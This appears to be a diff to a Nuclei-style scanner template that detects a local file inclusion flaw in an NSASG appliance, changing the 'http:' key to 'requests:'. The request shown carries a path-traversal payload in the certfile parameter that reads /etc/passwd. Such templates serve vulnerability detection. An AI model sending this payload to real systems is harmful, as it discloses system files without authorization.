@@ -7,7 +7,7 @@ info:
   reference: https://zhuanlan.zhihu.com/p/368054963
   tags: nsasg,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd"
